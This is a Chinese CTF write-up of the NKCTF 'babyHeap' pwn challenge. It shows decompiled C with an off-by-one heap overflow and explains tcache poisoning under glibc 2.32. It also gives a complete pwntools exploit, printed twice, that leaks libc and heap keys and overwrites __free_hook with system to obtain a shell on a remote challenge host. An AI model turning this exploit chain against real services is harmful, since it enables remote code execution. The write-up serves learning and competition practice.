# 【NKCTF】babyHeap-Off by one&Tcache Attack

> 原文: https://www.ctfiot.com/167429.html
> ID: 167429

一

程序分析

int __cdecl main(int argc, const char **argv, const char **envp)
{
 int choice; // [rsp+0h] [rbp-10h]
 char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v6; // [rsp+8h] [rbp-8h]

 v6 = __readfsqword(0x28u);
 init(argc, argv, envp);
 while ( 1 )
 {
 while ( 1 )
 {
 menu();
 read(0, buf, 4uLL);
 choice = strtol(buf, 0LL, 10);
 if ( choice <= 5 && choice > 0 )
 break;
 puts("Index error.");
 }
 if ( choice == 5 )
 break;
 switch ( choice )
 {
 case 1:
 add();
 break;
 case 2:
 delete();
 break;
 case 3:
 edit();
 break;
 default:
 show();
 break;
 }
 }
 puts("Goodbye and welcome to use it next time.");
 return 0;
}

unsigned __int64 add()
{
 signed int index; // [rsp+Ch] [rbp-14h]
 int size; // [rsp+10h] [rbp-10h]
 char buf[4]; // [rsp+14h] [rbp-Ch] BYREF
 unsigned __int64 v4; // [rsp+18h] [rbp-8h]

 v4 = __readfsqword(0x28u);
 printf("Enter the index: ");
 read(0, buf, 4uLL);
 index = strtol(buf, 0LL, 10);
 if ( (unsigned int)index > 0xF )
 {
 puts("Up to 16 nkctf notes can be created.");
 }
 else if ( note_array[index] )
 {
 puts("Sorry, this nkctf note has already been used.");
 }
 else
 {
 printf("Enter the Size: ");
 read(0, buf, 4uLL);
 size = strtol(buf, 0LL, 10);
 if ( size <= 256 )
 {
 note_size[index] = size;
 note_array[index] = malloc(note_size[index]);
 if ( !note_array[index] || !note_size[index] )
 my_error("malloc()", 0xFFFFFFFFLL);
 }
 else
 {
 puts("This nkctf note is too big.");
 }
 }
 return __readfsqword(0x28u) ^ v4;
}

unsigned __int64 delete()
{
 unsigned int v1; // [rsp+0h] [rbp-10h]
 char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v3; // [rsp+8h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 printf("Enter the index: ");
 read(0, buf, 4uLL);
 v1 = strtol(buf, 0LL, 10);
 if ( v1 > 0xF )
 {
 puts("Index error.");
 }
 else if ( note_array[v1] )
 {
 free((void *)note_array[v1]);
 note_array[v1] = 0LL;
 note_size[v1] = 0;
 if ( note_array[v1] || note_size[v1] )
 my_error("free()", 4294967294LL);
 }
 else
 {
 puts("The nkctf note to be freed does not exist.");
 }
 return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 edit()
{
 unsigned int v1; // [rsp+0h] [rbp-10h]
 char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v3; // [rsp+8h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 printf("Enter the index: ");
 read(0, buf, 4uLL);
 v1 = strtol(buf, 0LL, 10);
 if ( v1 > 0xF )
 {
 puts("Index error.");
 }
 else if ( note_array[v1] )
 {
 printf("Enter the content: ");
 my_read(note_array[v1], (unsigned int)note_size[v1]);
 }
 else
 {
 puts("The nkctf note to be filled was not created.");
 }
 return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 show()
{
 unsigned int v1; // [rsp+0h] [rbp-10h]
 char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v3; // [rsp+8h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 printf("Enter the index: ");
 read(0, buf, 4uLL);
 v1 = strtol(buf, 0LL, 10);
 if ( v1 > 0xF )
 {
 puts("Index error.");
 }
 else if ( note_array[v1] )
 {
 puts((const char *)note_array[v1]);
 }
 else
 {
 puts("The nkctf note to be printed was not created.");
 }
 return __readfsqword(0x28u) ^ v3;
}

__int64 __fastcall my_read(__int64 a1, int a2)
{
 unsigned int v3; // [rsp+10h] [rbp-10h]
 int i; // [rsp+14h] [rbp-Ch]

 for ( i = 0; i <= a2; ++i )//逻辑错误导致1个字节的溢出
 {
 v3 = read(0, (void *)(i + a1), 1uLL);
 if ( *(_BYTE *)(i + a1) == 10 )
 break;
 }
 return v3;
}

保护全开，CRUD全都提供了，但是没有明显可利用的地方，问题出在edit()函数输入内容时使用的my_read()函数，看名字都很可移:)，其中根据创建时输入的chunkSize进行循环，由于逻辑错误导致会多读取一个字节，可以进行溢出。

二

漏洞利用及原理

◆堆溢出Off by one

已知在向堆输入内容时可进行一个字节的溢出，所以当我们申请0x?8个字节时便可实际输入0x?9篡改下一个chunkSize，于是我们可以进行如下利用：

此时chunk#1被重新至于原位且此时记录大小为0xE8，真实大小依旧为0x68，可随意篡改，泄露chunk#2，于是进行以下利用：

此时我们已经实现了libcBase Leak和Chunk Extends，题目给出了的ibc版本为glibc-2.32，由于应用了Tcache，所以决定使用Tcache poisoning进行任意地址写。

Tcache整体和FastBin较相似，同采取单链表 LIFO进行管理，也既其FreeChunk仅有fd字段，区别是在利用时，FastBin等都将对ChunkHeader进行检查，而Tcache的检查极其少，导致安全性低，其中值得注意的一项检查和一项保护措施分别如下：

在glibc-2.31后，对FastBin/Tcache的fd字段进行了混淆保护，当第一个FreeChunk进入分类中时，&FreeChunk#0 >> 3将作为key被保存并写入FreeChunk#0->fd，而后该分类的每个FreeChunk->fd在存取时都将与key进行异或，所以若是我们要篡改fd字段，则需要泄露key。

在glibc 2.29之前，TcacheChunk以16 bytes进行对齐，而在这之后，当申请的大小64<=size<=128，则以16 bytes进行对齐，其它情况下则以8 bytes进行对齐，所以若是申请的&FakeChunk不符合对齐条件，需要-=8以绕过检查。

当tcache_perthread_struct->counts=0时，则会直接跳过Tcache从而去别处分配。

1.先泄露并保存Tcache[X]->key后在篡改fd时与真实Address进行异或。

2.若是报错malloc(): unaligned tcache chunk detected，则将FakeFd-8。

3.篡改使tcache_perthread_struct->counts+1或者篡改FreeChunk#1或之后FreeChunk的fd以保证在申请到FakeChunk前tcache_perthread_struct->counts!=0。

三

Exploit

from pwn import *

#p = process(["./ld-2.32.so", "./pwn"],env={"LD_PRELOAD":"./libc-2.32.so"})
#p = process("./pwn")

context(os='linux', arch='amd64', log_level='debug')
p = remote("node2.yuzhian.com.cn",36361)

libc = ELF("./libc-2.32.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#gdb.attach(p)
sleep(1)

def add(index,size):
 p.sendlineafter("Your choice: ","1")
 p.sendafter("Enter the index: ",str(index))
 p.sendafter("Enter the Size: ",str(size))
def free(index):
 p.sendlineafter("Your choice: ","2")
 p.sendafter("Enter the index: ",str(index))
def edit(index,content):
 p.sendlineafter("Your choice: ","3")
 p.sendafter("Enter the index: ",str(index))
 p.sendafter("Enter the content: ",content)
def show(index):
 p.sendlineafter("Your choice: ","4")
 p.sendafter("Enter the index: ",str(index))

add(0,0x68)
add(1,0x68)
add(2,0x68)
add(3,0x100)
add(4,0x100)
add(5,0x100)
add(6,0x100)
add(7,0x68)
add(8,0x68)
add(9,0x68)
add(10,0x68)
add(11,0x68)
add(12,0x68)

payload = b"A"*0x68
payload += b"xE1"
edit(0,payload)

free(1)
add(1,0xD8)

payload = b"A"*0x68
payload += b"x71"
edit(0,payload)
payload = b"x00"*0x68
payload += p64(0x4b1)+b"n"
edit(1,payload)

free(2)

payload = b"A"*0x70+b"n"
edit(1,payload)

show(1)
mainArena = u64(p.recvuntil("x7f")[-6:].ljust(8,b"x00"))-96-0xa
mallocHook = mainArena-0x10
libcBase = mallocHook - libc.sym['__malloc_hook']
freeHook = libcBase + libc.sym['__free_hook']
systemCall = libcBase + libc.sym['system']
oneGadGet = libcBase+0xdf54c
oneGadGet1 = libcBase+0xdf54f
oneGadGet2 = libcBase+0xdf552
print("libcBase ==================> 『{}』".format(hex(libcBase)))
print("mainArena ==================> 『{}』".format(hex(mainArena)))

payload = b"x00"*0x68 + p64(0x4b1)+p64(mainArena+96)+p64(mainArena+96)+b"n"
edit(1,payload)

free(3)
free(4)
free(5)
free(6)
add(3,0x68)
add(4,0x68)
add(5,0x68)
add(6,0x68)

free(3)
free(4)

payload = b"A"*0x6e+b"Mn"
edit(1,payload)
show(1)
p.recvuntil("Mn",drop=True)
key = u64(p.recvuntil("n",drop=True).ljust(8,b"x00"))
fakeChunk = freeHook
fakeChunkX = (freeHook)^key
fakeChunkM = (mallocHook)^key

payload = b"A"*0x68+p64(0x71)+b"n"
edit(1,payload)

payload = b"A"*0x68
payload += b"xE1"
edit(7,payload)

free(8)
add(8,0xD8)
add(4,0x68)

free(9)
payload = b"A"*0x6f + b"n"
edit(8,payload)
show(8)

p.recvuntil("An",drop=True)
heapAddr = u64(p.recvuntil("n",drop=True).ljust(8,b"x00")) ^ key

edit(0,b"/bin/shx00;n")
binsh = heapAddr-0x150
print("mainArena ==================> 『{}』".format(hex(mainArena)))
print("key ==================> 『{}』".format(hex(key)))
print("fakeChunk ==================> 『{}』".format(hex(fakeChunk)))
print("fakeChunkX ==================> 『{}』".format(hex(fakeChunkX)))
print("heapAddr ==================> 『{}』".format(hex(heapAddr)))
print("binsh ==================> 『{}』".format(hex(binsh)))
print("libcBase ==================> 『{}』".format(hex(libcBase)))
print("freeHook ==================> 『{}』".format(hex(freeHook)))

payload = b"A"*0x68 + p64(0x71) + p64(fakeChunkX)+b"n"
edit(8,payload)
add(13,0x68)
add(14,0x68)

payload = p64(systemCall)+b"n"
edit(14,payload)
free(0)

p.interactive()
p.close()

看雪ID：LeaMov

https://bbs.kanxue.com/user-home-952954.htm

*本文为看雪论坛优秀文章，由 LeaMov 原创，转载请注明来自看雪社区

# 往期推荐

1、Qemu源码浅析之v0.1.6

2、堆利用学习：the house of einherjar

3、Bugku CTF安卓逆向LoopAndLoop

4、CVE-2021-32760漏洞分析与复现

5、Hikari源码分析 – AntiClassDump

6、Android第一代加壳的验证和测试

球分享

球点赞

球在看

点击阅读原文查看更多


```
一
程序分析
```



```
int __cdecl main(int argc, const char **argv, const char **envp)
{
 int choice; // [rsp+0h] [rbp-10h]
 char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v6; // [rsp+8h] [rbp-8h]

 v6 = __readfsqword(0x28u);
 init(argc, argv, envp);
 while ( 1 )
 {
 while ( 1 )
 {
 menu();
 read(0, buf, 4uLL);
 choice = strtol(buf, 0LL, 10);
 if ( choice <= 5 && choice > 0 )
 break;
 puts("Index error.");
 }
 if ( choice == 5 )
 break;
 switch ( choice )
 {
 case 1:
 add();
 break;
 case 2:
 delete();
 break;
 case 3:
 edit();
 break;
 default:
 show();
 break;
 }
 }
 puts("Goodbye and welcome to use it next time.");
 return 0;
}
```



```
unsigned __int64 add()
{
 signed int index; // [rsp+Ch] [rbp-14h]
 int size; // [rsp+10h] [rbp-10h]
 char buf[4]; // [rsp+14h] [rbp-Ch] BYREF
 unsigned __int64 v4; // [rsp+18h] [rbp-8h]

 v4 = __readfsqword(0x28u);
 printf("Enter the index: ");
 read(0, buf, 4uLL);
 index = strtol(buf, 0LL, 10);
 if ( (unsigned int)index > 0xF )
 {
 puts("Up to 16 nkctf notes can be created.");
 }
 else if ( note_array[index] )
 {
 puts("Sorry, this nkctf note has already been used.");
 }
 else
 {
 printf("Enter the Size: ");
 read(0, buf, 4uLL);
 size = strtol(buf, 0LL, 10);
 if ( size <= 256 )
 {
 note_size[index] = size;
 note_array[index] = malloc(note_size[index]);
 if ( !note_array[index] || !note_size[index] )
 my_error("malloc()", 0xFFFFFFFFLL);
 }
 else
 {
 puts("This nkctf note is too big.");
 }
 }
 return __readfsqword(0x28u) ^ v4;
}
```



```
unsigned __int64 delete()
{
 unsigned int v1; // [rsp+0h] [rbp-10h]
 char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v3; // [rsp+8h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 printf("Enter the index: ");
 read(0, buf, 4uLL);
 v1 = strtol(buf, 0LL, 10);
 if ( v1 > 0xF )
 {
 puts("Index error.");
 }
 else if ( note_array[v1] )
 {
 free((void *)note_array[v1]);
 note_array[v1] = 0LL;
 note_size[v1] = 0;
 if ( note_array[v1] || note_size[v1] )
 my_error("free()", 4294967294LL);
 }
 else
 {
 puts("The nkctf note to be freed does not exist.");
 }
 return __readfsqword(0x28u) ^ v3;
}
```



```
unsigned __int64 edit()
{
 unsigned int v1; // [rsp+0h] [rbp-10h]
 char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v3; // [rsp+8h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 printf("Enter the index: ");
 read(0, buf, 4uLL);
 v1 = strtol(buf, 0LL, 10);
 if ( v1 > 0xF )
 {
 puts("Index error.");
 }
 else if ( note_array[v1] )
 {
 printf("Enter the content: ");
 my_read(note_array[v1], (unsigned int)note_size[v1]);
 }
 else
 {
 puts("The nkctf note to be filled was not created.");
 }
 return __readfsqword(0x28u) ^ v3;
}
```



```
unsigned __int64 show()
{
 unsigned int v1; // [rsp+0h] [rbp-10h]
 char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
 unsigned __int64 v3; // [rsp+8h] [rbp-8h]

 v3 = __readfsqword(0x28u);
 printf("Enter the index: ");
 read(0, buf, 4uLL);
 v1 = strtol(buf, 0LL, 10);
 if ( v1 > 0xF )
 {
 puts("Index error.");
 }
 else if ( note_array[v1] )
 {
 puts((const char *)note_array[v1]);
 }
 else
 {
 puts("The nkctf note to be printed was not created.");
 }
 return __readfsqword(0x28u) ^ v3;
}
```



```
__int64 __fastcall my_read(__int64 a1, int a2)
{
 unsigned int v3; // [rsp+10h] [rbp-10h]
 int i; // [rsp+14h] [rbp-Ch]

 for ( i = 0; i <= a2; ++i )//逻辑错误导致1个字节的溢出
 {
 v3 = read(0, (void *)(i + a1), 1uLL);
 if ( *(_BYTE *)(i + a1) == 10 )
 break;
 }
 return v3;
}
```



```
二

漏洞利用及原理
```



```
三
Exploit
```



```
from pwn import *

#p = process(["./ld-2.32.so", "./pwn"],env={"LD_PRELOAD":"./libc-2.32.so"})
#p = process("./pwn")

context(os='linux', arch='amd64', log_level='debug')
p = remote("node2.yuzhian.com.cn",36361)

libc = ELF("./libc-2.32.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#gdb.attach(p)
sleep(1)

def add(index,size):
 p.sendlineafter("Your choice: ","1")
 p.sendafter("Enter the index: ",str(index))
 p.sendafter("Enter the Size: ",str(size))
def free(index):
 p.sendlineafter("Your choice: ","2")
 p.sendafter("Enter the index: ",str(index))
def edit(index,content):
 p.sendlineafter("Your choice: ","3")
 p.sendafter("Enter the index: ",str(index))
 p.sendafter("Enter the content: ",content)
def show(index):
 p.sendlineafter("Your choice: ","4")
 p.sendafter("Enter the index: ",str(index))

add(0,0x68)
add(1,0x68)
add(2,0x68)
add(3,0x100)
add(4,0x100)
add(5,0x100)
add(6,0x100)
add(7,0x68)
add(8,0x68)
add(9,0x68)
add(10,0x68)
add(11,0x68)
add(12,0x68)

payload = b"A"*0x68
payload += b"xE1"
edit(0,payload)

free(1)
add(1,0xD8)

payload = b"A"*0x68
payload += b"x71"
edit(0,payload)
payload = b"x00"*0x68
payload += p64(0x4b1)+b"n"
edit(1,payload)

free(2)

payload = b"A"*0x70+b"n"
edit(1,payload)

show(1)
mainArena = u64(p.recvuntil("x7f")[-6:].ljust(8,b"x00"))-96-0xa
mallocHook = mainArena-0x10
libcBase = mallocHook - libc.sym['__malloc_hook']
freeHook = libcBase + libc.sym['__free_hook']
systemCall = libcBase + libc.sym['system']
oneGadGet = libcBase+0xdf54c
oneGadGet1 = libcBase+0xdf54f
oneGadGet2 = libcBase+0xdf552
print("libcBase ==================> 『{}』".format(hex(libcBase)))
print("mainArena ==================> 『{}』".format(hex(mainArena)))

payload = b"x00"*0x68 + p64(0x4b1)+p64(mainArena+96)+p64(mainArena+96)+b"n"
edit(1,payload)

free(3)
free(4)
free(5)
free(6)
add(3,0x68)
add(4,0x68)
add(5,0x68)
add(6,0x68)

free(3)
free(4)

payload = b"A"*0x6e+b"Mn"
edit(1,payload)
show(1)
p.recvuntil("Mn",drop=True)
key = u64(p.recvuntil("n",drop=True).ljust(8,b"x00"))
fakeChunk = freeHook
fakeChunkX = (freeHook)^key
fakeChunkM = (mallocHook)^key

payload = b"A"*0x68+p64(0x71)+b"n"
edit(1,payload)

payload = b"A"*0x68
payload += b"xE1"
edit(7,payload)

free(8)
add(8,0xD8)
add(4,0x68)

free(9)
payload = b"A"*0x6f + b"n"
edit(8,payload)
show(8)

p.recvuntil("An",drop=True)
heapAddr = u64(p.recvuntil("n",drop=True).ljust(8,b"x00")) ^ key

edit(0,b"/bin/shx00;n")
binsh = heapAddr-0x150
print("mainArena ==================> 『{}』".format(hex(mainArena)))
print("key ==================> 『{}』".format(hex(key)))
print("fakeChunk ==================> 『{}』".format(hex(fakeChunk)))
print("fakeChunkX ==================> 『{}』".format(hex(fakeChunkX)))
print("heapAddr ==================> 『{}』".format(hex(heapAddr)))
print("binsh ==================> 『{}』".format(hex(binsh)))
print("libcBase ==================> 『{}』".format(hex(libcBase)))
print("freeHook ==================> 『{}』".format(hex(freeHook)))

payload = b"A"*0x68 + p64(0x71) + p64(fakeChunkX)+b"n"
edit(8,payload)
add(13,0x68)
add(14,0x68)

payload = p64(systemCall)+b"n"
edit(14,payload)
free(0)

p.interactive()
p.close()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/4-1710415200.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/8-1710415200.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/8-1710415201.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/2-1710415201.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/5-1710415202.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/10-1710415202.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/1-1710415203.gif)